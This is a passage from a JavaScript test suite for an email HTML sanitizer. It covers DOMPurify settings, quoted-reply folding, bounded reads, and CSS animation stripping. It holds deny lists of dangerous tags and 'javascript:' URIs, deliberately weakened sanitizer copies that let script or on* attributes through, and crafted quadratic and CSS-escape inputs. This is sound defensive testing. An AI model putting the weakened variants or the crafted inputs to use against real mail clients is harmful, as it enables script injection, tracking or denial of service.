  ok(JSON.stringify(cfg.ADD_URI_SAFE_ATTR) === JSON.stringify([...MF.ALLOWED_ATTR.filter((a) => a !== 'href' && a !== 'src'), 'data-vs-blocked', 'data-vs-quote']) && cfg.ALLOWED_ATTR.includes('data-vs-quote') && !cfg.ADD_URI_SAFE_ATTR.includes('href') && !cfg.ADD_URI_SAFE_ATTR.includes('src') && /ADD_URI_SAFE_ATTR: MF\.DOMPURIFY_CONFIG\.ADD_URI_SAFE_ATTR/.test(dom), 'DOMPurify is told every NON-URL attribute is URI-safe (its strict URI regexp would strip width / colspan / bgcolor / the blocked marker — measured in chrome) — href and src stay judged');
  ok(cfg.ALLOWED_TAGS.every((t) => MF.ALLOWED_TAGS.includes(t)) && MF.DROP_TAGS.every((t) => cfg.FORBID_TAGS.includes(t)) && ['script', 'iframe', 'svg', 'math', 'meta', 'base', 'link', 'object', 'embed', 'input', 'button'].every((t) => cfg.FORBID_TAGS.includes(t) && !cfg.ALLOWED_TAGS.includes(t)) && !cfg.ALLOWED_TAGS.includes('form') && cfg.ALLOWED_URI_REGEXP.test('https://a') && !cfg.ALLOWED_URI_REGEXP.test('javascript:x') && !cfg.ALLOWED_URI_REGEXP.test('data:text/html,x') && cfg.ALLOW_DATA_ATTR === false && !cfg.ALLOWED_ATTR.some((a) => /^on/.test(a)), 'DOMPurify\'s config is the module\'s lists: dangerous elements FORBIDDEN, no on* / data-* attribute, URIs http(s) / mailto / a data: raster only');
}

// ── ⑨ CONTROLS: a weakened sanitizer goes RED on ① ───────────────────────
console.log('⑨ controls: patched copies (outside the tree)');
{
  const M = mutantCopies('mail-frame', REPO);
  const src = fs.readFileSync(path.join(REPO, 'src/mail-frame.js'), 'utf-8');
  const keepAll = src.replace('      if (!ALLOWED_ATTR.includes(an)) continue;', '      if (false) continue;');
  const m1 = M.load('src/mail-frame.js', keepAll, 'keep-every-attr');
  const b1 = runCorpus(m1);
  ok(keepAll !== src && b1.some((b) => /on\* attribute/.test(b)), `CONTROL: a sanitizer that keeps every attribute is RED on the corpus (${b1.length} mails)`, b1.slice(0, 2).join(' | '));
  const scriptOk = src.replace("const RAW_TEXT = Object.freeze(['script', ", "const RAW_TEXT = Object.freeze([").replace("const DROP_TAGS = Object.freeze(['script', ", "const DROP_TAGS = Object.freeze([").replace("const ALLOWED_TAGS = Object.freeze(['a', ", "const ALLOWED_TAGS = Object.freeze(['script', 'a', ");
  const m2 = M.load('src/mail-frame.js', scriptOk, 'script-through');
  const b2 = runCorpus(m2);
  ok(scriptOk !== src && b2.some((b) => /a <script/.test(b)), `CONTROL: a sanitizer that lets <script> through is RED on the corpus (${b2.length} mails)`, b2.slice(0, 2).join(' | '));
  const noCssFix = src.replace("  s = s.replace(/\\\\/g, '');\n", '');
  const m3 = M.load('src/mail-frame.js', noCssFix, 'css-escapes');
  const b3 = runCorpus(m3);
  ok(noCssFix !== src && b3.some((b) => /^style attr url quoted \+ escapes/.test(b)), `CONTROL: CSS without the backslash rule lets u\\rl( reach the attacker (${b3.length})`, b3.slice(0, 2).join(' | '));
  for (const c of copiesCensus(M.files, M.dir, REPO, { minCopies: 3 })) ok(c.pass, c.name, c.detail);
}

// ── ⑩ the quoted history is folded; a wide mail fits ─────────────────────
console.log('⑩ quoted history folded once (the outermost), a wide mail fitted');
{
  const gm = '<div dir="ltr"><p>new words</p></div><div class="gmail_quote"><div class="gmail_attr">On x, A wrote:</div><blockquote class="gmail_quote"><p>old</p><div class="gmail_quote"><blockquote class="gmail_quote"><p>older</p></blockquote></div></blockquote></div>';
  const r1 = MF.sanitizeMailHtml(gm);
  ok(r1.quotes === 1 && (r1.html.match(/data-vs-quote="1"/g) || []).length === 1 && /<div class="gmail_quote" data-vs-quote="1"><div class="gmail_attr">/.test(r1.html) && /<p>new words<\/p>/.test(r1.html), 'a Gmail reply: the OUTERMOST gmail_quote is marked once; the quotes inside it carry no mark; the new words are untouched', r1.html);
  const r2 = MF.sanitizeMailHtml('<p>a</p><blockquote type="cite"><p>cited</p></blockquote><p>b</p><blockquote type="cite"><p>cited again</p></blockquote>');
  ok(r2.quotes === 2 && (r2.html.match(/<blockquote type="cite" data-vs-quote="1">/g) || []).length === 2, 'Apple Mail / Thunderbird: each top-level blockquote type=cite is its own fold (two quotes, two marks)', r2.html);
  const r3 = MF.sanitizeMailHtml('<blockquote>the author\'s own emphasis</blockquote><div class="yahoo_quoted"><p>y</p></div><div class="x gmail_quote y">g</div><div class="gmail_quoted">no</div><div id="divRplyFwdMsg">hdr</div>');
  ok(r3.quotes === 2 && !/<blockquote data-vs-quote/.test(r3.html) && /<div class="yahoo_quoted" data-vs-quote="1">/.test(r3.html) && /<div class="x gmail_quote y" data-vs-quote="1">/.test(r3.html) && !/gmail_quoted" data-vs-quote/.test(r3.html) && !/divRplyFwdMsg[^>]*data-vs-quote/.test(r3.html), 'a bare <blockquote> is NOT folded; yahoo_quoted and a class list holding gmail_quote are; a look-alike class and Outlook\'s header are not', r3.html);
  const r4 = MF.sanitizeMailHtml('<div class="gmail_quote" data-vs-quote="1"><p>q</p></div><p data-vs-quote="1">not a quote</p>');
  ok(r4.quotes === 1 && (r4.html.match(/data-vs-quote/g) || []).length === 1 && !/<p data-vs-quote/.test(r4.html), 'the mark is OURS: a data-vs-quote the mail itself carries is dropped (not an allowed attribute) — only the reader\'s own marking survives', r4.html);
  ok(MF.isQuoteContainer('div', [['class', 'GMAIL_QUOTE']]) && MF.isQuoteContainer('blockquote', [['type', 'Cite']]) && !MF.isQuoteContainer('span', [['class', 'gmail_quote']]) && !MF.isQuoteContainer('div', [['class', 'gmail_attr']]), 'isQuoteContainer: case-insensitive; a span is never a container; gmail_attr (the "On … wrote" line) is not one');
  const doc = MF.composeSrcdoc({ body: r1.html, nonce: 'n', token: 't', quoteShow: 'Show </script><b>x', quoteHide: 'Hide "q"' });
  ok(/\[data-vs-quote\]:not\(\.vs-open\)\{display:none;\}/.test(doc) && /var S="Show \\u003c\/script>\\u003cb>x",Hh="Hide \\"q\\""/.test(doc) && (doc.match(/<\/script/g) || []).length === 1 && (doc.match(/<script/g) || []).length === 1, 'the frame hides a marked quote until opened; the button\'s words ride in OUR script with < escaped — a label cannot close the script', doc.slice(doc.indexOf('var S='), doc.indexOf('var S=') + 80));
  const rs = MF.resizerScript('t');
  ok(/lastW=-1/.test(rs) && /if\(cw===lastW\)return;lastW=cw;b\.style\.zoom='1';var sw=b\.scrollWidth;b\.style\.zoom=sw>cw\+1\?String\(cw\/sw\):'1';/.test(rs) && /function h\(\)\{fit\(\);/.test(rs) && /b\.getBoundingClientRect\(\)\.height,b\.scrollHeight\*z/.test(rs) && /ro\.observe\(document\.body\)/.test(rs), 'the resizer fits a wide mail to the frame (zoom = frame ÷ the body\'s natural width), re-judged only when the frame\'s width CHANGES, before every height it posts — and the height is the body\'s ZOOMED box (a frame can shrink again), the body observed too');
  ok(/document\.querySelectorAll\('\[data-vs-quote\]'\)/.test(rs) && /classList\.toggle\('vs-open'\)/.test(rs) && /aria-expanded/.test(rs) && /el\.parentNode\.insertBefore\(b,el\)/.test(rs), 'one button per marked quote, inserted before it, toggling vs-open and saying so (aria-expanded), then the height is re-posted');
  const wire = fs.readFileSync(path.join(REPO, 'src/lib/channel-mail-frame.js'), 'utf-8');
  ok(/composeSrcdoc\(\{ body: clean, nonce: rnd\(\), token: s\.token, pictures, quoteShow: t\('Show quoted text'\), quoteHide: t\('Hide quoted text'\) \}\)/.test(wire), 'WIRING: the DOM half hands the frame the device\'s words for the quote toggle');
  const win = fs.readFileSync(path.join(REPO, 'src/lib/channel-window.js'), 'utf-8');
  ok(/if \(slot\) row\.insertBefore\(slot, body\);/.test(win) && !/row\.appendChild\(slot\)/.test(win), 'WIRING: the mail slot (bar + frame) is inserted BEFORE the text body — the bar never jumps under the text in Plain text');
  for (const [lang, show, hide] of [['zh', '显示引用内容', '收起引用内容'], ['ja', '引用を表示', '引用を隠す']]) {
    const dict = fs.readFileSync(path.join(REPO, `src/lib/i18n-${lang}.js`), 'utf-8');
    ok(dict.includes(`"Show quoted text": "${show}"`) && dict.includes(`"Hide quoted text": "${hide}"`), `i18n ${lang}: the quote toggle's two labels (Hide quoted text is the plain view's own key, shared)`);
  }
  // CONTROL: a reader that never marks a quote — ⑩'s first pin goes red on it
  const M = mutantCopies('mail-frame-quote', REPO);
  const src = fs.readFileSync(path.join(REPO, 'src/mail-frame.js'), 'utf-8');
  const noMark = src.replace("    if (quote) { keep.push(['data-vs-quote', '1']); quoteAt = open.length; quotes++; }", "    if (false) { keep.push(['data-vs-quote', '1']); quoteAt = open.length; quotes++; }");
  const m1 = M.load('src/mail-frame.js', noMark, 'no-quote-mark');
  const c1 = m1.sanitizeMailHtml(gm);
  ok(noMark !== src && c1.quotes === 0 && !/data-vs-quote/.test(c1.html), 'CONTROL: a sanitizer that never marks a quote is RED on the Gmail reply (no mark, no fold)');
  for (const c of copiesCensus(M.files, M.dir, REPO, { minCopies: 1 })) ok(c.pass, c.name, c.detail);
}

// ── ⑪ bounded work: the sanitizer is linear at its own bound ─────────────
console.log('⑪ bounded work: every quadratic shape at MAX_HTML_BYTES inside the budget (+ controls in a child)');
{
  const { spawn } = await import('node:child_process');
  const N = MF.MAX_HTML_BYTES - 64;
  const BUDGET_MS = 1500;
  /** name → a zero-argument SOURCE (the child builds the same bytes) — every one is a mail at the size bound */
  const SHAPES = [
    ['a tag with no ">" to the end', `() => '<a '.repeat(${Math.floor(N / 3)})`],
    ['an unterminated attribute quote, repeated', `() => '<a x="'.repeat(${Math.floor(N / 6)})`],
    ['"<b<b<b…"', `() => '<b'.repeat(${Math.floor(N / 2)})`],
    ['a dropped <svg> then "<svg " with no ">"', `() => '<svg>' + '<svg '.repeat(${Math.floor(N / 5) - 1})`],
    ['CSS quote pairs with no newline', `() => '<style>' + "''".repeat(${Math.floor(N / 2) - 10}) + '</style>'`],
    ['CSS "url(" with no ")"', `() => '<style>' + 'url('.repeat(${Math.floor(N / 4) - 5}) + '</style>'`],
    ['a style attribute of "url(" with no ")"', `() => '<p style="' + 'url('.repeat(${Math.floor(N / 4) - 5}) + '">x</p>'`],
    ['CSS "@font-face{" with no "}"', `() => '<style>' + '@font-face{'.repeat(${Math.floor(N / 11) - 2}) + '</style>'`],
  ];
  const build = (src) => new Function(`return (${src})()`)();
  for (const [name, src] of SHAPES) {
    const x = build(src);
    const t = process.hrtime.bigint();
    const r = MF.sanitizeMailHtml(x);
    const ms = Number(process.hrtime.bigint() - t) / 1e6;
    ok(r.ok && ms < BUDGET_MS && !/<(?!\/?(style|p)\b)[a-z]/i.test(r.html.slice(0, 4096)), `${name} at ${(x.length / 1048576).toFixed(2)} MB: ${ms.toFixed(0)} ms (budget ${BUDGET_MS})`, `ok=${r.ok} ms=${ms}`);
  }
  /** THE SAME JUDGE in a child: require `file`, build the shape, time sanitizeMailHtml; cut at the budget. */
  const inChild = (file, src) => new Promise((res) => {
    const code = `const M=require(${JSON.stringify(file)});const x=(${src})();const t=process.hrtime.bigint();M.sanitizeMailHtml(x);process.stdout.write(String(Number(process.hrtime.bigint()-t)/1e6));`;
    const c = spawn(process.execPath, ['-e', code], { stdio: ['ignore', 'pipe', 'ignore'] });
    let out = '';
    c.stdout.on('data', (d) => { out += d; });
    const cut = setTimeout(() => c.kill('SIGKILL'), BUDGET_MS + 1500);
    c.on('exit', (_code, sig) => { clearTimeout(cut); const ms = out ? Number(out) : null; res({ ms, killed: !!sig, over: !!sig || !(ms < BUDGET_MS) }); });
  });
  const M = mutantCopies('mail-frame-linear', REPO);
  const src = fs.readFileSync(path.join(REPO, 'src/mail-frame.js'), 'utf-8');
  const OLD = [
    ['the per-"<" re-walk (text one character at a time)', 0, "    if (!a) { out.push(escText(s.slice(i).replace(CTRL, ''))); break; }", "    if (!a) { out.push('&lt;'); i++; continue; }"],
    ['the dropped element\'s `[^>]*>` skip', 3, "      const re = new RegExp(`<(/?)${name}(?=[\\\\s/>])`, 'ig');\n      re.lastIndex = i;\n      let depth = 1, mm, gt = -2;\n      while (depth > 0 && (mm = re.exec(s))) {\n        if (gt !== -1 && gt < re.lastIndex) gt = s.indexOf('>', re.lastIndex);\n        if (gt < 0) break;\n        depth += mm[1] ? -1 : 1;\n        re.lastIndex = gt + 1;\n      }\n", "      const re = new RegExp(`<(/?)${name}(?=[\\\\s/>])[^>]*>`, 'ig');\n      re.lastIndex = i;\n      let depth = 1, mm;\n      while (depth > 0 && (mm = re.exec(s))) depth += mm[1] ? -1 : 1;\n"],
    ['the per-quote newline scan', 4, "    if (nlAt !== -1 && nlAt <= i) nlAt = css.indexOf('\\n', i + 1);", "    nlAt = css.indexOf('\\n', i + 1);"],
    ['the url() regex', 5, "  s = cssUrls(s);", "  s = s.replace(/url\\s*\\(\\s*(['\"]?)([^)'\"]*)\\1\\s*\\)/gi, (m, q, u) => (DATA_IMAGE_RE.test(u.trim()) && u.length <= MAX_DATA_URL ? `url(\"${u.trim()}\")` : 'none'));"],
    ['the @font-face `\\{[^}]*\\}` block', 7, "  s = s.replace(/@(?:namespace|font-face|charset)[^{;]*(?:\\{[^}]*\\}?|;)?/gi, '');", "  s = s.replace(/@(?:namespace|font-face|charset)[^{;]*(\\{[^}]*\\}|;)?/gi, '');"],
  ];
  const runs = [];
  for (const [what, shape, from, to] of OLD) {
    const patched = src.replace(from, to);
    if (patched === src) { ok(false, `CONTROL setup: ${what} — the fixed line is present`, from); continue; }
    const file = M.write('src/mail-frame.js', patched, `linear-${shape}`);
    runs.push(inChild(file, SHAPES[shape][1]).then((r) => ok(r.over, `CONTROL: a copy with ${what} is OVER the budget on "${SHAPES[shape][0]}" (${r.killed ? 'cut at the budget' : `${Math.round(r.ms)} ms`})`, JSON.stringify(r))));
  }
  // the judge itself: the REAL module in the same child harness is under the budget (the harness is not what fails)
  runs.push(inChild(path.join(REPO, 'src/mail-frame.js'), SHAPES[0][1]).then((r) => ok(!r.over, `the child harness on the REAL module: under the budget (${r.ms == null ? 'no answer' : Math.round(r.ms) + ' ms'})`, JSON.stringify(r))));
  await Promise.all(runs);
  // (round 1's Content-Length wiring pin moved into ⑫: the header rung lives in readBounded, the bytes decide)
  for (const c of copiesCensus(M.files, M.dir, REPO, { minCopies: 5 })) ok(c.pass, c.name, c.detail);
}

// ── ⑫ (security verify r2, 2026-09-28) THE BODY IS BOUNDED AT THE BYTES, NEVER AT A HEADER ─────────────────
// Round 1's "bound before the download" read `Content-Length` — and the attachment route piped a file stream,
// chunked, with no length: the guard compared 0 with the bound and `res.arrayBuffer()` pulled the whole body
// (the route's 100 MB ceiling) into memory on every open of the conversation, in every client. The read now
// stops at the bound and cancels the stream; a length over it is refused before the first byte; the route says
// the file's size. CONTROL: a copy without the running bound reads a 3 MB chunked body whole.
console.log('⑫ the mail body is read to the bound and no further (a header is a claim, the bytes are the fact)');
{
  const { pathToFileURL } = await import('node:url');
  const { readBounded } = await import(pathToFileURL(path.join(REPO, 'src/lib/bounded-read.js')));
  const CHUNK = 64 * 1024;
  /** A Response over a chunked stream of `total` bytes with NO Content-Length (what a piped file looks like);
   *  `state` records how many bytes were pulled and whether the stream was cancelled. */
  const chunked = (total, state, headers = {}) => new Response(new ReadableStream({
    pull(ctrl) { if (state.sent >= total) { ctrl.close(); return; } const n = Math.min(CHUNK, total - state.sent); ctrl.enqueue(new Uint8Array(n)); state.sent += n; },
    cancel() { state.cancelled = true; },
  }), { headers });
  const MAX = MF.MAX_HTML_BYTES;
  const s1 = { sent: 0, cancelled: false };
  const r1 = await readBounded(chunked(3 * 1024 * 1024, s1), MAX);
  ok(r1.over === true && r1.bytes > MAX && r1.bytes <= MAX + CHUNK && s1.sent <= MAX + 2 * CHUNK && s1.cancelled === true, `a 3 MB chunked body with no Content-Length: refused OVER the bound after ${r1.bytes} bytes (≤ bound + one chunk), the stream CANCELLED (${s1.sent} bytes pulled of 3 MB)`, JSON.stringify([r1, s1]));
  const s2 = { sent: 0, cancelled: false };
  const r2 = await readBounded(chunked(1024 * 1024, s2), MAX);
  ok(!r2.over && r2.buf && r2.buf.byteLength === 1024 * 1024 && r2.bytes === 1024 * 1024 && !s2.cancelled, 'a 1 MB chunked body: read whole (1 048 576 bytes), never cancelled');
  const s3 = { sent: 0, cancelled: false };
  const r3 = await readBounded(chunked(10, s3, { 'content-length': String(MAX + 1) }), MAX);
  ok(r3.over === true && r3.bytes === 0 && r3.claimed === MAX + 1 && s3.sent === 0, 'a Content-Length OVER the bound is refused before the first byte (the cheap rung stays)', JSON.stringify([r3, s3]));
  const s4 = { sent: 0, cancelled: false };
  const r4 = await readBounded(chunked(MAX + 1, s4, { 'content-length': '10' }), MAX);
  ok(r4.over === true && s4.cancelled, 'a Content-Length UNDER the bound is never trusted: the bytes still decide (a lying header is refused at the bound)', JSON.stringify([r4, s4]));
  const r5 = await readBounded(new Response('abc'), 2).catch((e) => ({ threw: e.message }));
  ok(r5.over === true, 'a Response whose body is a static string is judged by its bytes too', JSON.stringify(r5));
  let threw = null; try { await readBounded(new Response('x'), NaN); } catch (e) { threw = e.message; }
  ok(/finite bound/.test(threw || ''), 'no bound ⇒ refused loudly (never an unbounded read by omission)');
  // WIRING: the DOM half reads through readBounded (never arrayBuffer); the route says the size before the stream
  const dom = fs.readFileSync(path.join(REPO, 'src/lib/channel-mail-frame.js'), 'utf-8');
  ok(/import \{ readBounded \} from '\.\/bounded-read\.js';/.test(dom) && /const got = await readBounded\(res, MF\.MAX_HTML_BYTES\);/.test(dom) && /if \(got\.over\) return \{ error: t\('This message is too large to show formatted — showing plain text'\), code: 'too-large', noRetry: true \};/.test(dom) && !/arrayBuffer\(\)/.test(dom) && !/res\.headers\.get\('content-length'\)/.test(dom), 'WIRING: the DOM half reads the body through readBounded at MAX_HTML_BYTES — no arrayBuffer(), no header rung of its own');
  // the ATTACHMENT route's own text (the .197 integration: lane channel-threads' emoji route streams a file too, earlier in the file)
  const routeAll = fs.readFileSync(path.join(REPO, 'src/routes/channels.js'), 'utf-8');
  const attAt = routeAll.indexOf("router.get('/api/channels/:adapterId/:convId/attachment/:id',");
  const route = attAt >= 0 ? routeAll.slice(attAt, (routeAll.indexOf('\nrouter.', attAt + 1) + 1 || routeAll.length + 1) - 1) : '';
  const clAt = route.indexOf("res.setHeader('Content-Length', String(stat.size))"), pipeAt = route.indexOf('const st = fs.createReadStream(r.file);');
  ok(attAt > 0 && clAt > 0 && pipeAt > clAt && /await fs\.promises\.stat\(r\.file\)/.test(route), 'WIRING: the attachment route answers Content-Length (the file\'s stat, async) BEFORE piping the stream');
  const br = fs.readFileSync(path.join(REPO, 'src/lib/bounded-read.js'), 'utf-8');
  ok(!/^\s*import\s/m.test(br) && /export async function readBounded/.test(br), 'src/lib/bounded-read.js imports nothing (PURE over the Fetch primitives; the suite and the bundle take the same rule)');
  // CONTROL: a copy with the running bound removed reads the 3 MB body WHOLE
  const M = mutantCopies('mail-frame-bounded', REPO);
  const noBound = br.replace('    if (n > limit) {', '    if (false) {');
  const f = M.write('src/lib/bounded-read.js', noBound, 'no-running-bound');
  const m = await import(pathToFileURL(f));
  const sc = { sent: 0, cancelled: false };
  const rc = await m.readBounded(chunked(3 * 1024 * 1024, sc), MAX);
  ok(noBound !== br && !rc.over && rc.bytes === 3 * 1024 * 1024 && !sc.cancelled, `CONTROL: without the running bound the 3 MB chunked body is read whole (${rc.bytes} bytes, never cancelled) — the round-1 shape`, JSON.stringify([rc && rc.over, rc && rc.bytes, sc]));
  for (const c of copiesCensus(M.files, M.dir, REPO, { minCopies: 1 })) ok(c.pass, c.name, c.detail);
}

// ── ⑬ (security verify r2, 2026-09-28) A MAIL DOES NOT ANIMATE ITS ROW: no keyframes, and the parent's height budget ─
// A `@keyframes` on the body's height made the resizer post a new height 60 times a second and the parent applied
// every one — the conversation window jumped under the reader (measured: 181 heights and 44 scrollTop changes in
// 3 s, the row between 100 and 19 000 px) for as long as the mail was on screen. Two walls: the CSS carries no
// keyframes / animation / transition (the root), and the parent's PURE budget settles freely for 1.5 s, then applies
// one change per 250 ms and FREEZES a row whose height keeps flipping (the belt). CONTROLS: a copy that keeps the
// animation, a copy whose budget never freezes.
console.log('⑬ a mail does not animate its row: keyframes stripped, the parent\'s height budget');
{
  const css = MF.sanitizeCss('@keyframes g{from{height:100px}to{height:19000px}} body{animation:g .2s linear infinite alternate;color:red} .x{transition:height 1s;-webkit-animation-name:g;animation-duration:2s} @-webkit-keyframes k { 0% { top: 0 } 100% { top: 1px } } @-moz-keyframes m{from{a:b}} p{margin:0}');
  ok(!/keyframes|animation|transition/i.test(css) && /color:red/.test(css) && /p\{margin:0\}/.test(css), 'a <style>: every @keyframes block (nested braces, every vendor prefix) and every animation-* / transition-* declaration is gone; the other rules stay', css);
  ok(MF.sanitizeCss('@keyframes g{from{height:100px} to{height:1px}') === '', 'an unclosed @keyframes takes the rest (never a half block left to parse)');
  const inline = MF.sanitizeMailHtml('<div style="animation:g 1s infinite;height:10px;transition:all 1s">x</div>');
  ok(/style=";?height:10px;?"/.test(inline.html) && !/animation|transition/.test(inline.html), 'an inline style loses its animation / transition and keeps the rest', inline.html);
  ok(MF.cssKeyframes('a{b:c} @keyframes x{0%{a:b}} @keyframes y{} z{q:r}') === 'a{b:c}   z{q:r}', 'cssKeyframes: two blocks, the text between and after kept');
  // the budget's table (t in ms since the frame went live at 0)
  const walk = (rows) => { const b = MF.heightBudget(0); return rows.map(([h, t]) => MF.heightVerdict(b, h, t).act); };
  ok(walk([[100, 10], [200, 20], [300, 30], [400, 1400]]).join() === 'apply,apply,apply,apply', 'while the frame settles (< 1 500 ms) every change applies (fonts, pictures, layout)');
  ok(walk([[100, 10], [200, 1600], [300, 1700], [300, 1900], [400, 1950], [400, 2300], [400, 2400]]).join() === 'apply,apply,hold,apply,hold,apply,hold', 'after the settle: one change per 250 ms — a change inside the gap is held, the same height asked again past the gap applies (the final size lands), an equal height is nothing');
  const pulse = []; for (let i = 0; i < 20; i++) pulse.push([i % 2 ? 300 : 100, 1600 + i * 300]);
  const acts = walk(pulse);
  ok(acts.slice(0, 9).every((a) => a === 'apply') && acts[9] === 'frozen' && acts.slice(9).every((a) => a === 'frozen'), `a height that FLIPS direction ${MF.HEIGHT_FLIP_CAP} times inside ${MF.HEIGHT_FLIP_WINDOW_MS / 1000} s is FROZEN for the frame's life — the first two heights set the direction, the ${MF.HEIGHT_FLIP_CAP}th reversal freezes (${acts.slice(0, 11).join(',')})`);
  const slow = []; for (let i = 0; i < 20; i++) slow.push([i % 2 ? 300 : 100, 1600 + i * 2000]);
  ok(walk(slow).every((a) => a === 'apply'), 'a person toggling a quote open and closed every 2 s is never frozen (the flips leave the 10 s window)');
  ok(walk([[100, 10], [200, 1600], [300, 1900], [400, 2200], [500, 2500], [600, 2800]]).every((a) => a === 'apply'), 'a row that only GROWS (pictures arriving, the quote opened) never freezes');
  const fb = MF.heightBudget(0); MF.heightVerdict(fb, 100, 10); fb.frozen = true;
  ok(MF.heightVerdict(fb, 5000, 20).act === 'frozen' && MF.heightVerdict(fb, 5000, 20).h === 100, 'a frozen budget answers its LAST height, whatever is asked');
  ok(MF.heightVerdict(null, 100, 0).act === 'hold', 'no budget ⇒ hold (never an unbudgeted apply)');
  // THE TRAILING EDGE (security verify r2, continued): the frame posts a height only when its own measure CHANGES,
  // so a hold that is not re-judged is the LAST height of a burst lost for the frame's life — measured in chrome: a
  // 40 px narrowing posted 677 → 696 30 ms apart, the row stayed 677, the mail's last line cut (no scroll inside)
  // THE BURST, simulated through the DOM half's own rule on a fake clock: every message → the verdict; a hold with
  // retryAt arms ONE timer that re-judges heightPending at its time. Judged: the row ends at the LAST height posted.
  const burst = (M, posts) => {
    const bb = M.heightBudget(0); let row = null, timer = null; const q = [];
    const apply = (h, t) => { const v = M.heightVerdict(bb, h, t); if (v.act === 'apply') row = v.h; else if (v.act === 'hold' && v.retryAt !== undefined && timer === null) timer = v.retryAt + 5; };
    for (const [h, t] of posts) q.push([t, () => apply(h, t)]);
    for (let now = 0; now <= 6000; now++) { for (const [t, f] of q) if (t === now) f(); if (timer !== null && now === timer) { timer = null; const p = M.heightPending ? M.heightPending(bb) : null; if (p !== null && p !== undefined) apply(p, now); } }
    return row;
  };
  const drag = [[640, 10], [677, 3000], [696, 3030]];
  const pics = [[300, 10], [420, 2000], [560, 2100], [610, 2180]];   // pictures after Show pictures, past the settle
  {
    const b = MF.heightBudget(0);
    MF.heightVerdict(b, 640, 10);
    const a1 = MF.heightVerdict(b, 677, 3000), a2 = MF.heightVerdict(b, 696, 3030);
    ok(a1.act === 'apply' && a2.act === 'hold' && a2.retryAt === 3250 && MF.heightPending(b) === 696, 'a height held for the GAP is kept (heightPending = 696) and the answer names when to re-judge it (retryAt = the last apply + 250 ms)', J([a1, a2, b.pending]));
    ok(MF.heightVerdict(b, 700, 3100).act === 'hold' && MF.heightPending(b) === 700, 'a later held height SUPERSEDES the pending one (the newest measure wins)');
    const a3 = MF.heightVerdict(b, MF.heightPending(b), 3250);
    ok(a3.act === 'apply' && a3.h === 700 && MF.heightPending(b) === null, 'at retryAt the pending height APPLIES and nothing waits any more', J(a3));
    MF.heightVerdict(b, 720, 3300);
    ok(MF.heightPending(b) === 720 && MF.heightVerdict(b, 700, 3310).act === 'hold' && MF.heightPending(b) === null, 'a height back to the APPLIED one clears the pending (the burst ended where the row already is)');
    const fz = MF.heightBudget(0); MF.heightVerdict(fz, 100, 10); MF.heightVerdict(fz, 200, 3000); MF.heightVerdict(fz, 300, 3010); fz.frozen = true;
    ok(MF.heightPending(fz) === null, 'nothing waits on a FROZEN budget (a pulse never lands through the trailing edge)');
    ok(burst(MF, drag) === 696 && burst(MF, pics) === 610, `the burst lands: a window drag ends at 696 (the last posted), three pictures within 250 ms end at 610`, J([burst(MF, drag), burst(MF, pics)]));
  }
  // WIRING: the DOM half mints the budget when the frame goes live and asks it before every applied height
  const dom = fs.readFileSync(path.join(REPO, 'src/lib/channel-mail-frame.js'), 'utf-8');
  const mintAt = dom.indexOf('s.budget = MF.heightBudget(Date.now());'), askAt = dom.indexOf('const hv = MF.heightVerdict(s.budget, h, Date.now());'), applyAt = dom.indexOf("s.h = hv.h; s.frame.style.height = hv.h + 'px'; s.box.dataset.h = String(hv.h);");
  ok(mintAt > 0 && askAt > 0 && applyAt > askAt && /if \(v\.act === 'height'\) applyHeight\(s, v\.h\);/.test(dom) && /if \(hv\.act === 'frozen' && !s\.frozenSaid\) \{ s\.frozenSaid = true; s\.box\.dataset\.frozen = '1'; \}/.test(dom) && !/s\.h = v\.h;/.test(dom), 'WIRING: a budget per live frame (minted with the token), the listener hands every height to applyHeight, the verdict is asked there, only an `apply` reaches the row; a freeze is marked on the box (data-frozen)');
  ok(/if \(hv\.act === 'hold' && hv\.retryAt !== undefined && !s\.trail\) \{/.test(dom) && /s\.trail = setTimeout\(\(\) => \{ s\.trail = 0; const p = MF\.heightPending\(b\); if \(p !== null && s\.frame && s\.budget === b\) applyHeight\(s, p\); \}, Math\.max\(0, hv\.retryAt - Date\.now\(\)\) \+ 5\);/.test(dom) && /if \(s\.trail\) \{ clearTimeout\(s\.trail\); s\.trail = 0; \}/.test(dom), 'WIRING: a hold with retryAt arms ONE timer per frame that re-judges heightPending of THAT budget (a rebuilt frame\'s new budget is never fed an old height); dropping the frame clears it');
  // the animation shape at the bound stays linear (⑪'s judge)
  const N = MF.MAX_HTML_BYTES - 64; const t = process.hrtime.bigint();
  const r = MF.sanitizeMailHtml('<style>' + '@keyframes x{'.repeat(Math.floor(N / 13) - 2) + '</style>');
  const ms = Number(process.hrtime.bigint() - t) / 1e6;
  ok(r.ok && ms < 1500 && !/keyframes/.test(r.html), `"@keyframes x{" with no "}" at the bound: ${ms.toFixed(0)} ms (linear)`);
  // CONTROLS
  const M = mutantCopies('mail-frame-anim', REPO);
  const src = fs.readFileSync(path.join(REPO, 'src/mail-frame.js'), 'utf-8');
  const keepAnim = src.replace("  s = cssKeyframes(s);\n  s = s.replace(/(?:-webkit-|-moz-|-o-)?(?:animation|transition)(?:-[a-z-]+)?\\s*:[^;}]*/gi, '');", '');
  const m1 = M.load('src/mail-frame.js', keepAnim, 'keep-animation');
  const c1 = m1.sanitizeCss('@keyframes g{from{height:100px}to{height:19000px}} body{animation:g .2s infinite alternate}');
  ok(keepAnim !== src && /@keyframes/.test(c1) && /animation:g/.test(c1), 'CONTROL: a sanitizer that keeps CSS animations lets the pulse through (the round-2 shape)', c1);
  const noFreeze = src.replace('    if (b.flips.length >= HEIGHT_FLIP_CAP) { b.frozen = true; b.pending = null; return { act: \'frozen\', h: b.lastH }; }', '');
  const m2 = M.load('src/mail-frame.js', noFreeze, 'never-freeze');
  const b2 = m2.heightBudget(0); const a2 = pulse.map(([h, t2]) => m2.heightVerdict(b2, h, t2).act);
  ok(noFreeze !== src && a2.every((a) => a === 'apply'), 'CONTROL: a budget without the flip cap applies a pulse forever (the jumping conversation)', a2.join(','));
  // the round-2 budget as it shipped: a hold kept nothing and named no retry — the burst's last height is lost
  const noTrail = src.replace("  if (!settling && t - b.lastAt < HEIGHT_MIN_GAP_MS) { b.pending = h; return { act: 'hold', h, retryAt: b.lastAt + HEIGHT_MIN_GAP_MS }; }", "  if (!settling && t - b.lastAt < HEIGHT_MIN_GAP_MS) return { act: 'hold', h };");
  const m3 = M.load('src/mail-frame.js', noTrail, 'no-trailing-edge');
  ok(noTrail !== src && burst(m3, drag) === 677 && burst(m3, pics) === 420, `CONTROL: the round-2 budget (a hold keeps nothing) ends the drag at 677 for a 696 mail and the pictures at 420 for 610 — the last line cut, the measured chrome shape`, J([burst(m3, drag), burst(m3, pics)]));
